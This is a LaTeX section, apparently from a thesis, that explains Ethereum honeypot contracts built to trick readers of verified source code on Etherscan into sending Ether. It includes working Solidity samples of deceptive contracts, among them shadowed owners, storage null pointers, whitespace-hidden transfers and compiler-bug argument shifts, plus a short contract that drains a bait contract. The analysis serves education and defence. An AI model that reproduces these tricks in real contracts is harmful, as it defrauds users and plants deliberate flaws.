@@ -1,0 +1,270 @@
+\subsection{Honeypots \& Blockchain Explorers}
+To get the trust of users interacting with the smart contract, owners of smart contracts can publish the source code on blockchain-explorers like \href{https://etherscan.io}{etherscan.io}. To verify that the provided source code matches the bytecode on the blockchain, Etherscan compares the result of their compilation of the source code to the bytecode deployed on the blockchain.
+
+\subsubsection{Underhanded Source Code}
+\label{section:honeypot:underhanded}
+Some contracts, so-called \textit{honeypots}, try to abuse the confidence produced by this feature publishing misleading source code that tricks the user into sending Ether to the contract. Most of the time this is done by "promising" more Ether in return. Since some of the traps are based on design decisions of Solidity or use common misconceptions about smart contracts, they can be seen as a vulnerability of the smart contract ecosystem.
+
+Finding honeypot-contracts on the blockchain is simple: Since the owners want their contract and the underhanded code to be found, they are listed within the \textit{Verified Contracts}-list of the blockchain-explorers. Usually they fulfil three properties: Commonly there is about one Ether inside the contract to incentivize potential victims to have a look at the contract. Then, there is an obvious way to retrieve the balance; sometimes a well-known vulnerability that could be used to "steal" the funds, in other cases the bait is presented as a gift. The third part is the trap, that somehow stops the Ether from being sent to the victim (although the code suggests that), and a way for the owner to retrieve the funds again. (see \cite{wagner:honeypots})
+
+\paragraph{\texttt{X2_FLASH}-Honeypot}
+A real honeypot-contract called \texttt{X2_FLASH}\footnote{found at \cite{etherscan:uncalledcallhoneypot}} (with the balance of 1 Ether) whose code was published on Etherscan.io contained a function whose code suggested it would return all the Ether stored in the contract when it was sent more than a specific amount:
+\begin{minted}{solidity}
+function X2() public payable {
+    if(msg.value > 1 ether) {
+        msg.sender.call.value(this.balance);
+    }
+}
+\end{minted}
+
+Contrary to the first impression, \mintinline{solidity}{msg.sender.call.value(this.balance)} does not send Ether. Calling \mintinline{solidity}{msg.sender.call.value(this.balance)} only returns another version of the call function that will send all the Ether owned by the contract along with the call. To execute that function, additional parenthesis after the call would have been required:
+\begin{minted}{solidity}
+msg.sender.call.value(this.balance)()
+\end{minted}
+
+This is not the only way to program Solidity in an underhanded way: In the following I will present some other approaches that have been or could be used to trick users reading the source code:
+
+\paragraph{Shadowed Variables}
+When a contract inherits state variables from a parent-contract, the state variables of the parent contract will be added to the child-contract. If the child contract contains a state variable with the same name as the parent, the variable from the parent contract will be shadowed.
+
+This was abused in the \texttt{StakeholderBattle}-honeypot presented in the following listing. At first, it seems like the contract can be bought with one Ether -- and then the complete balance can be withdrawn.
+
+\begin{minted}{solidity}
+contract Ownable {
+    address public owner = msg.sender;
+    modifier onlyOwner() { require(msg.sender == owner); _; }
+}
+
+contract PurchaseableContract is Ownable {
+    address public owner;
+
+    function purchase() public payable {
+        owner = msg.sender;
+        largestStake = msg.value;
+    }
+
+    function withdraw() public onlyOwner {
+        msg.sender.transfer(this.balance);
+    }
+}
+\end{minted}
+
+Since in \mintinline{solidity}{purchase()} the \texttt{owner} variable from \texttt{PurchaseableContract} is modified, but the modifier \texttt{onlyOwner} uses the owner defined in \texttt{Ownable}, the contract creator remains the "real" owner and therefore will be able to withdraw the funds from the contract.\footnote{the honeypot was found by \cite{wagner:honeypots}, the original code can be found at \cite{etherscan:stakeholderbattle} which was slightly modified for this example}
+
+\paragraph{Storage-Null-Pointers}
+As already explained in section \ref{section:deepdive:memory}, from a programmer's perspective the storage can be seen as an array of \texttt{uint256} with enough fields to be addressed by a \texttt{uint256}.
+
+The first variable declared in storage is saved in field \( 0 \), the second in \( 1 \) et cetera. When using dynamic arrays, the length is stored in the corresponding field of the variable, and position of the specific array element is calculated as the hash value of the position of the length counter in storage and the array index. If a stored value like a \mintinline{solidity}{struct} requires more than one field to be stored, the subsequent fields will be used.
+
+When declared, a pointer to a \mintinline{solidity}{struct} has by default the value \( 0 \). So when accessing an uninitialized \mintinline{solidity}{struct}, the memory for the regular contract variables will be used.\footnote{this vulnerability was presented by \cite{cryptronics:nullstruct}}.
+
+In the sample-honeypot \texttt{BuyableOwnership} presented in listing \ref{lst:blockchainexplorers:ownerhistory} is based on this trick: The contract promises, that once bought using the \mintinline{solidity}{claim()}-function for one Ether, the user can withdraw all the funds (including those that were left by the last owner). When the contract is created, the address of the creator is set to be the first owner.
+
+\begin{listing}[H]
+	\begin{minted}{solidity}
+contract PurchaseableContract {
+    struct OwnerHistoryEntry {
+        address ethereumAddress;
+        uint ownershipEnd;
+    }
+    
+    address public owner = msg.sender;
+    uint ownershipStart;
+    OwnerHistoryEntry[] ownerHistory;
+    
+    function purchase() public payable {
+        require(msg.value >= 1 ether);
+		
+        // Set new owner
+        address oldOwner = owner;
+        owner = msg.sender;
+
+        // Save old owner in owner history        
+        OwnerHistoryEntry storage entry;
+        entry.ethereumAddress = oldOwner;
+        entry.ownershipEnd = block.timestamp - ownershipStart;
+        ownerHistory.push(entry);
+    
+        ownershipStart = block.timestamp;
+    }
+    
+    function withdraw() public {
+        require(msg.sender == owner);
+        owner.transfer(address(this).balance);
+    }
+}
+\end{minted}
+	\caption{The \texttt{StakeholderBattle}-smart contract uses null-struct-pointers to modify other regions of the memory.}
+	\label{lst:blockchainexplorers:ownerhistory}
+\end{listing}
+
+Whenever another user tries to claim ownership by sending one Ether, the sender is first set as the owner, and then the former owner is added to the \mintinline{solidity}{ownerHistory}. Because \mintinline{solidity}{entry} is an uninitialized storage pointer, the address of the old owner is stored in the first slot of the memory, which is the same slot the new owner was written to.
+
+Because of this, the creator of the contract remains the owner and can simply withdraw all the funds received.
+
+\paragraph{Value and Balance}
+When sending Ether to a contract, the value sent along is added to the contract balance before the code is executed. Since this is not obvious to some users, this can be used in a honeypot:\footnote{and indeed was used \cite{etherscan:multiplicatorx3}, which was also discovered by \cite{wagner:honeypots}}
+
+By having \mintinline{solidity}{require(msg.value > address(this.balance));} inside a function, the user might think that they have to send more Ether than contained in the contract to pass this check. But since \mintinline{solidity}{address(this.balance)} is always at least as large as \mintinline{solidity}{msg.value}, this check will evaluate to \mintinline{solidity}{true}.
+
+\paragraph{Abusing Compiler Bugs}
+Since smart contracts can be compiled and verified using an arbitrary compiler version, it is possible to abuse compiler bugs of old versions in order to trick unsuspecting users:
+
+Until version 0.4.12 of the Solidity compiler there was a bug in the argument encoder for external function calls, that made it skip empty strings. (see \cite[SkipEmptyStringLiteral]{solidity:buglist}) Because of this, all the other arguments would just be shifted to the left:
+
+In the following \texttt{GiveAway}-contract this compiler bug is used: When launching the external call (using the \mintinline{solidity}{this}-keyword) to the own function \mintinline{solidity}{releaseEther()} inside the function \mintinline{solidity}{claim()}, the arguments get shifted so that \mintinline{solidity}{giver} is at the location of \mintinline{solidity}{winner} -- which will send all the Ether of the contract to the creator of the honeypot.\footnote{vulnerability discovered by \cite{reddit:honeypots}}
+
+\begin{minted}{solidity}
+contract GiveAway {
+    address owner = msg.sender;
+    event Given(bytes32 message, address target, address giver);
+    
+    function GiveAway() public payable {}
+
+    function claim() public payable {
+        if(msg.value < 1 ether) throw;
+        this.releaseEther("", msg.sender, owner);
+    }
+    
+    function releaseEther(bytes32 message, address winner, address giver) {
+        require(msg.sender == address(this));
+        require(winner.send(address(this).balance));
+        Given(bytes32(message), winner, giver);
+    }
+}
+\end{minted}
+
+\paragraph{Similar Variable Names}
+\label{section:honeypots:similar}
+Another rather simple trick that was found on the Etherscan was using similar-named variables to hide malicious behavior:\footnote{Since solidity only allows alphanumeric characters or \texttt{\$} and \texttt{_} as identifiers the possibility to use homoglyphs is limited. see \cite[\texttt{docs/grammar.txt}]{ethereum:solidity}}
+
+The creator of the smart contract \texttt{FirePonzi} used this trick to steal from their users: Two similar-looking state variables were declared and initialized at different locations of the smart contract:\footnote{smart contract located at \cite{etherscan:fireponzi}, vulnerability found by \cite{wagner:honeypots}}
+\begin{minted}{solidity}
+uint public payoutCursor_Id_ = 0;
+// ...
+uint public payoutCursor_Id = 0;
+\end{minted}
+
+By participating in the scheme themselves, the owner became \mintinline{solidity}{persons[0]}. The idea was to increase the pointer after each payout to a former participant in the Ponzi scheme; but since a different variable was incremented than used, every payout would have been sent to the initial owner.
+\begin{minted}{solidity}
+persons[payoutCursor_Id].etherAddress.send(MultipliedPayout);
+payoutCursor_Id_++;
+\end{minted}
+
+\paragraph{Silently Failing Functions}
+\label{section:honeypots:silentlyfailing}
+Another trick that is often used in combination with others is to not make the transaction fail if a requirement is not fulfilled. Because of this, Ether sent along with the transaction will be kept in the contract balance and not be refunded if a property is not met.
+
+So if a user calls a function with modifier \texttt{ownerOnly} without being the owner, in
+\begin{minted}{solidity}
+modifier ownerOnly() { if (owner == msg.sender) _; }
+\end{minted}
+the Ether sent along will be kept and the transaction will be displayed as successful, whereas
+\begin{minted}{solidity}
+modifier ownerOnly() { require(owner == msg.sender); _; }
+\end{minted}
+would make the transaction fail and therefore refund the sent Ether.
+
+\paragraph{Hidden Code}
+In an earlier version of Etherscan, lines that were too long for the contract code field would just overflow and therefore not be visible on the platform. This could be used to hide malicious commands from users inspecting the code:
+
+This trick was used by the \texttt{WhaleGivaway1}-smart contract (that can be found at \cite{etherscan:whalegiveaway} and was discovered by \cite{wagner:honeypots}), that first in the giveaway function secretly transferred all the Ether contained in the contract to the owner:
+\begin{minted}{solidity}
+function GetFreebie() public payable {
+    if(msg.value >1 ether) { /* 3460 spaces */ Owner.transfer(this.balance);
+        msg.sender.transfer(this.balance);
+    }
+}
+\end{minted}
+
+As a counteraction Etherscan now breaks the lines instead of making them overflow - so that this technique can not be used any more.
+
+\subsubsection{Wrong Library Source Code}
+When uploading and validating smart contract source code on Etherscan, library code can be uploaded along with the original code. This is often done in order to provide the contract interface and information about the functionality of the library. A common misconception is that the library specified in the contract source has to be used, which is not true: Etherscan by default does not check the linked libraries, so that a completely different library can be used.
+
+In most real cases, this is used in combination with the behavior of Etherscan.io presented in the next section:
+
+\subsubsection{Zero-Value Internal Transactions}
+An \textit{internal transaction} happens, if a smart contract calls another smart contract. On \url{etherscan.io}, those transactions are only displayed if Ether was transferred with the call -- internal transactions with a value of \( 0 \) are not shown.
+
+This can be used to hide transactions that change the state. To be safe it is always worth it to check alternative block chain viewers that display those transactions, like for example \url{etherchain.org}.
+
+\paragraph{\texttt{COIN_BOX}-Honeypot}
+\label{section:honeypot:library}
+The smart contract \texttt{COIN_BOX}\footnote{on the blockchain at \cite{etherscan:coinbox}} uses those two features.\footnote{as noticed later, another analysis of this contract was given in \cite{alexsherbuck:dissectinghoneypot}}
+
+The contract uses an external \texttt{LogFile}-contract to save information about the transaction. The address of that external contract can be set during an initialization phase (that is active if \mintinline{solidity}{bool initialized} is true), which starts as soon as the contract is created and ends with a call to
+\begin{minted}{solidity}
+function Initialized() public {
+    intitalized = true;
+}
+\end{minted}
+
+After deploying the contract, first \mintinline{solidity}{SetLogFile} is called from the Ethereum account that has deployed the contract setting the address to a verified instance of the \texttt{LogFile}-library.
+\begin{minted}{solidity}
+function SetLogFile(address _log) public {
+    if(intitalized) throw;
+    Log = LogFile(_log);
+}
+\end{minted}
+
+Afterwards, an internal call to the second function is launched, changing the \texttt{LogFile} reference to another library. Since the transaction did not transfer any Ether and was launched by another smart contract, it is not displayed on \url{etherscan.io}. Then \mintinline{solidity}{Initialized()} is called by the user account, which is visible on Etherscan again.
+
+The incentive to send Ether to the contract is especially clever: In \mintinline{solidity}{function Collect(uint _am)} there is an Ether-transfer using \mintinline{solidity}{call} that can be exploited using a re-entrancy-exploit. But to execute it, at least \texttt{MinSum} Ether has to be stored in the \texttt{COIN_BOX}, and therefore have been sent to \mintinline{solidity}{function Put(uint _lockTime)} before.
+\begin{minted}{solidity}
+if(acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {
+    if(msg.sender.call.value(_am)()) {
+        acc.balance-=_am;
+        Log.AddMessage(msg.sender, _am, "Collect");
+    }
+}
+\end{minted}
+
+Although the source code for the exchanged library is not available and nobody has been tricked by the attack yet, a way how the trap and the retrieval could have worked will now be presented: When calling \mintinline{solidity}{Log.AddMessage()}, if the sent address is the owner or the log message is \mintinline{solidity}{"Put"} (as sent to the contract when logging using \mintinline{solidity}{Put()}, which the honeypot creator wants to succeed), the secretly pushed log contract will just return, in all other cases the whole transaction will be stopped by a \mintinline{solidity}{revert()}-command. This allows the owner to retrieve all the funds, including the ones by the trapped user, by executing the re-entrancy-attack themselves.
+
+\subsubsection{Transaction Race}
+\label{section:honeypots:transactionordering}
+The Transaction Ordering Dependency-vulnerability presented in section \ref{section:vulnerability:transactionorder} can be abused in honeypots:
+
+The contract \texttt{EvilGiftCard} shown in listing \ref{lst:honeypot:transactionrace} has the vulnerability that, even if \mintinline{solidity}{put()} had already been called successfully, the password can be changed by calling the function again, sending along 1 Ether:
+\begin{listing}[H]
+	\begin{minted}[
+        linenos=true,
+        firstnumber=1
+    ]{solidity}
+contract EvilGiftCard {
+    bytes32 hash;
+    
+    function put(bytes32 _hash) public payable {
+        require(msg.value >= 1 ether);
+        hash = _hash;
+    }
+    
+    function take(bytes password) public {
+        require(keccak256(password) == hash && msg.sender == tx.origin);
+        msg.sender.transfer(address(this).balance);
+    }
+}
+    \end{minted}
+	\caption{A simplified transaction-race honeypot}
+	\label{lst:honeypot:transactionrace}
+\end{listing}
+
+After an attacker and later victim of the honeypot has changed the password and enters the \mintinline{solidity}{take()}-transaction, the owner can detect this their transaction in the transaction pool before it has been mined, and can launch an own transaction trying to take the Ether with the same password extracted from the transaction data. Using a significantly higher gas price, the miners will prefer the new transaction, and with a relatively high chance the \mintinline{solidity}{take()}-transaction will be applied before the original one by the attacker.
+
+An important detail of this example is the usage of \mintinline{solidity}{tx.origin == msg.sender} in line 10 of the smart contract. If this check would have been omitted, the honeypot could have been emptied without any chance for the honeypot-owner to start the transaction race, because an attacker could have stolen the bait without triggering the honeypot by deploying the following contract:
+\begin{minted}{solidity}
+contract EvilGiftCardEmptier {
+    bytes password = "anything";
+    constructor(EvilGiftCard giftCard) payable public {
+        giftCard.put.value(msg.value)(keccak256(password));
+        giftCard.take(password);
+        require(address(this).balance > msg.value);
+        selfdestruct(msg.sender);
+    }
+}
+\end{minted}
+
+During its deployment the contract resets the password and empties the bait within one transaction - so that it's impossible to get an transaction in between those calls; and if the attack would not have been successful, the attacker would have only lost the gas required to launch the attack because of the \mintinline{solidity}{require()}. Requiring \mintinline{solidity}{tx.origin} to be equal to \mintinline{solidity}{msg.sender} ensures, that the \mintinline{solidity}{take()} is called directly.
+
+A similar honeypot can be found on the Ethereum blockchain; it will be quickly presented and explained in appendix \ref{appendix:racehoneypot}.
